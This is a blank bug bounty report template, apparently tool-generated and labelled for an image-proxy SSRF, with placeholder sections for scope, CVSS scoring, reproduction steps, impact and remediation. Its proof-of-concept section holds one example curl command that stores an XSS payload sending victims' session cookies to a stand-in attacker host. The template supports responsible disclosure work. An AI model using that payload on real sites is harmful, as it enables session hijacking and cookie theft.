# Bug Bounty Report: SSRF-in-image-proxy

**Document ID:** SSRF-in-image-proxy / V1.0
**Date:** 20260413
**Author:** Chris Kahn
**Status:** draft



---

## Vulnerability Summary

**Title:** *[Concise, specific title — e.g., "Stored XSS in user profile bio field allows session hijacking"]*

| Field | Value |
|-------|-------|
| **Platform** | *[HackerOne / Bugcrowd / Intigriti / Independent / Other]* |
| **Program** | *[Program name and URL]* |
| **Submission Date** | *[YYYY-MM-DD]* |
| **Vulnerability Type** | *[e.g., XSS, IDOR, SSRF, SQLi, Authentication Bypass, RCE]* |
| **Severity** | *[Critical / High / Medium / Low / Informational]* |
| **Bounty Status** | *[Pending / Triaged / Resolved / Duplicate / N/A]* |
| **Bounty Amount** | *[Amount or Pending]* |

**One-Line Summary:**
*[What the vulnerability is, where it exists, and what an attacker can achieve — in a single sentence.]*

---

## Target & Scope

| Attribute | Detail |
|-----------|--------|
| **Target Asset** | *[Domain, subdomain, API endpoint, or mobile app]* |
| **Asset Type** | *[Web Application / API / Mobile / Hardware / Network / Other]* |
| **URL / Endpoint** | *[Exact URL(s) or API route(s) affected]* |
| **Affected Parameter(s)** | *[Query param, POST field, header, cookie, etc.]* |
| **Authenticated?** | *[Yes (role: user/admin/moderator) / No (unauthenticated)]* |
| **In-Scope Confirmation** | *[Link to program scope page or policy confirming this asset is in scope]* |

### Environment

| Attribute | Detail |
|-----------|--------|
| **Browser / Client** | *[e.g., Chrome 125.0.6422 / Firefox 126 / Burp Suite 2024.x]* |
| **OS** | *[e.g., macOS 15.2 / Kali Linux 2024.4 / Windows 11]* |
| **Network** | *[Direct / VPN / Proxy — note if relevant to reproduction]* |

---

## Vulnerability Classification

### CWE Classification

| Field | Value |
|-------|-------|
| **Primary CWE** | *[CWE-XXX: Name — e.g., CWE-79: Improper Neutralization of Input During Web Page Generation]* |
| **Secondary CWE** | *[CWE-XXX if applicable, or N/A]* |
| **CWE Reference** | *[https://cwe.mitre.org/data/definitions/XXX.html]* |

### CVSS 3.1 Score

| Metric | Value | Rationale |
|--------|-------|-----------|
| **Attack Vector (AV)** | *[Network / Adjacent / Local / Physical]* | *[Why this vector applies]* |
| **Attack Complexity (AC)** | *[Low / High]* | *[Conditions required beyond attacker control]* |
| **Privileges Required (PR)** | *[None / Low / High]* | *[Auth level needed]* |
| **User Interaction (UI)** | *[None / Required]* | *[Does victim need to click/act?]* |
| **Scope (S)** | *[Unchanged / Changed]* | *[Does exploit cross security boundary?]* |
| **Confidentiality (C)** | *[None / Low / High]* | *[Data exposure level]* |
| **Integrity (I)** | *[None / Low / High]* | *[Data modification level]* |
| **Availability (A)** | *[None / Low / High]* | *[Service disruption level]* |

| Result | Value |
|--------|-------|
| **CVSS Vector** | *[e.g., CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]* |
| **CVSS Score** | *[X.X]* |
| **Severity Rating** | *[Critical (9.0–10.0) / High (7.0–8.9) / Medium (4.0–6.9) / Low (0.1–3.9) / Informational (0.0)]* |
| **Calculator Link** | *[https://www.first.org/cvss/calculator/3.1#VECTOR_STRING]* |

---

## Steps to Reproduce

*Provide clear, numbered steps that a triager with no prior context can follow to reproduce the vulnerability from scratch. Include exact URLs, payloads, and expected outcomes at each step.*

**Pre-requisites:**
*[Any setup required — accounts, roles, configurations, test data, specific browser settings, etc.]*

### Reproduction Steps

1. Navigate to `[exact URL]`
2. *[Authenticate as role X if required — provide test credential instructions]*
3. *[Exact action — e.g., "Enter the following payload in the 'bio' field:"]*

```
[PAYLOAD HERE]
```

4. *[Next action — e.g., "Click 'Save Profile'"]*
5. *[Trigger — e.g., "Open a new incognito window and visit the profile page at URL"]*
6. **Observe:** *[What happens — e.g., "JavaScript executes in the context of the victim's session"]*

### Expected Behavior
*[What should happen if the application handled input correctly — e.g., "The payload should be HTML-encoded and rendered as plain text."]*

### Actual Behavior
*[What actually happens — e.g., "The payload executes as JavaScript in the victim's browser, with access to their session cookies."]*

---

## Proof of Concept

### Summary
*[Brief description of the PoC — what it demonstrates and the attack scenario.]*

### HTTP Request / Payload

```http
[Raw HTTP request or curl command that triggers the vulnerability]
```

*Example curl:*
```bash
curl -X POST 'https://target.com/api/profile' \
  -H 'Cookie: session=XXXX' \
  -H 'Content-Type: application/json' \
  -d '{"bio": "<script>document.location=\"https://attacker.com/?c=\"+document.cookie</script>"}'
```

### HTTP Response (relevant excerpt)

```http
[Response headers and body showing the vulnerability — e.g., reflected payload, leaked data, error disclosure]
```

### Screenshots / Recordings

| # | Description | File |
|---|-------------|------|
| 1 | *[Payload injected into field]* | *[screenshot-01-injection.png]* |
| 2 | *[Payload executes on victim page]* | *[screenshot-02-execution.png]* |
| 3 | *[Exfiltrated data received on attacker server]* | *[screenshot-03-exfil.png]* |

*[For complex exploits, include a screen recording demonstrating the full attack chain.]*

### Automation Script (if applicable)

*[If you wrote an exploit script or automation, include it here with clear comments.]*

```python
# exploit-poc.py — Demonstrates [vulnerability type] on [target]
# Usage: python exploit-poc.py --target https://target.com --session COOKIE
# WARNING: For authorized testing only

[SCRIPT HERE]
```

---

## Impact Assessment

### Attack Scenario
*[Describe a realistic attack scenario. Who is the attacker? Who is the victim? What does the attacker gain? Walk through the full exploitation chain from initial access to final impact.]*

### Business Impact

| Dimension | Impact | Description |
|-----------|--------|-------------|
| **Confidentiality** | *[None / Low / High / Critical]* | *[What data is exposed — PII, credentials, financial data, internal systems?]* |
| **Integrity** | *[None / Low / High / Critical]* | *[What can be modified — user data, admin settings, transaction records?]* |
| **Availability** | *[None / Low / High / Critical]* | *[Can this cause service disruption, resource exhaustion, or data loss?]* |
| **Users Affected** | *[Single user / All users / Admin / Specific role]* | *[Scope of affected user population]* |
| **Data at Risk** | *[Type and estimated volume]* | *[e.g., "All user email addresses and password hashes (~50K records)"]* |
| **Financial Risk** | *[Low / Medium / High]* | *[Regulatory fines, breach costs, fraud potential]* |
| **Reputation Risk** | *[Low / Medium / High]* | *[Public disclosure impact, customer trust]* |

### Chained Vulnerabilities (if applicable)
*[If this finding chains with other vulnerabilities to increase impact, describe the chain here.]*

| Step | Vulnerability | Effect |
|------|--------------|--------|
| 1 | *[This finding]* | *[Initial access / data leak]* |
| 2 | *[Second vuln — e.g., IDOR]* | *[Privilege escalation]* |
| 3 | *[Third vuln — e.g., RCE]* | *[Full system compromise]* |

---

## Suggested Remediation

*[While not required, including fix recommendations demonstrates expertise and may improve bounty outcomes.]*

### Root Cause
*[What underlying weakness allows this vulnerability to exist — e.g., "User input is rendered into HTML without sanitization or output encoding."]*

### Recommended Fix

| Priority | Action | Detail |
|----------|--------|--------|
| **Immediate** | *[Short-term mitigation]* | *[e.g., "Implement CSP header with script-src 'self'"]* |
| **Permanent** | *[Root cause fix]* | *[e.g., "Apply context-aware output encoding on all user-controlled fields using DOMPurify"]* |
| **Preventive** | *[Systemic improvement]* | *[e.g., "Add automated SAST scanning to CI/CD pipeline for XSS patterns"]* |

### References for Fix
- *[OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XXX.html]*
- *[Vendor documentation or security advisory]*

---

## References & Supporting Materials

### External References

| Type | Link |
|------|------|
| **CWE Entry** | *[https://cwe.mitre.org/data/definitions/XXX.html]* |
| **OWASP Reference** | *[https://owasp.org/www-community/attacks/XXX]* |
| **CVE (if assigned)** | *[CVE-XXXX-XXXXX or "Not yet assigned"]* |
| **Vendor Advisory** | *[URL if applicable]* |
| **Related Disclosures** | *[Similar public reports or write-ups for context]* |

### Attached Files

| File | Description | SHA-256 |
|------|-------------|---------|
| *[poc-exploit.py]* | *[Proof of concept script]* | *[hash]* |
| *[screenshot-01.png]* | *[Injection point]* | *[hash]* |
| *[request.txt]* | *[Raw HTTP request]* | *[hash]* |
| *[video-demo.mp4]* | *[Full exploitation recording]* | *[hash]* |

---

## Submission Checklist

- [ ] Vulnerability is within program scope
- [ ] Program policy reviewed — no exclusions violated
- [ ] Steps to reproduce are complete and tested from a clean environment
- [ ] Proof of concept demonstrates actual security impact (not just theoretical)
- [ ] CVSS score calculated and vector string included
- [ ] CWE classification identified
- [ ] Impact section describes realistic attack scenario with business consequences
- [ ] All screenshots/recordings are annotated and clearly labeled
- [ ] No unauthorized access to real user data or production systems
- [ ] No destructive testing performed (DoS, data deletion, etc.)
- [ ] Report reviewed for clarity — a triager with no context can understand it
- [ ] Markdown formatting verified (headers, code blocks, tables render correctly)

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| *[YYYY-MM-DD]* | Vulnerability discovered |
| *[YYYY-MM-DD]* | Report submitted to *[Platform / Vendor]* |
| *[YYYY-MM-DD]* | Triaged / Acknowledged |
| *[YYYY-MM-DD]* | Fix deployed |
| *[YYYY-MM-DD]* | Bounty awarded |
| *[YYYY-MM-DD]* | Public disclosure (if applicable) |

---

## Approval

- **Researcher (Name / Handle):** ____________________  **Date:** __________
- **Reviewer (if internal):** ____________________  **Date:** __________

---

*Document generated by librarian v0.7.0 from template `bug-bounty-report`.*
